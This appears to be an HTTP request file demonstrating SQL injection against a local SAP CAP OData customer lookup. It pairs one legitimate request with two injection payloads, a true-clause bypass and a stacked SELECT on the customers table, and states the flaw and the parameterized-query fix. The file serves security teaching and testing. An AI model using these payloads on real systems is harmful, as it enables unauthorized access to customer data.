@server = http://localhost:4004
@username = incident.support@tester.sap.com
@password = initial

### ðŸ”’ SQL INJECTION VULNERABILITY DEMO (CAP OData Service)
# =====================================================
# VULNERABILITY: Unsafe string interpolation in `fetchCustomer` function
# RISK: Full database exposure via SQL injection
# ROOT CAUSE: Direct concatenation of user input into SQL query
# FIX: Use parameterized queries (CAP's cds.parse.expr() or @restrict.where)
# =====================================================

### âœ… Test 1: Legitimate Request (Sanity Check)
# Purpose: Verify normal functionality
# Payload: Valid customerID
# Expected: Single customer record (HTTP 200)
GET {{server}}/odata/v4/admin/fetchCustomer
Content-Type: application/json
Authorization: Basic {{username}}:{{password}}

{
  "customerID": "1004100"
}

### ðŸš¨ Test 2: Basic SQL Injection (True-Clause Attack)
# Payload: ' OR '1'='1
# Expected: Returns ALL customer records (HTTP 200)
# Impact: Unauthorized data access
GET {{server}}/odata/v4/admin/fetchCustomer
Content-Type: application/json
Authorization: Basic {{username}}:{{password}}

{
  "customerID": "1004100' OR '1'='1"
}

### ðŸš¨ Test 3: Select-Based SQL Injection (Multi-Statement Attack)
# Payload: '; SELECT * FROM sap_capire_incidents_Customers;--
# Expected: 
#   - CAP's SQLite adapter blocks multiple statements (HTTP 400)
#   - Other databases (HANA/PostgreSQL) might execute both queries
GET {{server}}/odata/v4/admin/fetchCustomer
Content-Type: application/json
Authorization: Basic {{username}}:{{password}}

{
  "customerID": "1004100'; SELECT * FROM sap_capire_incidents_Customers;--"
}
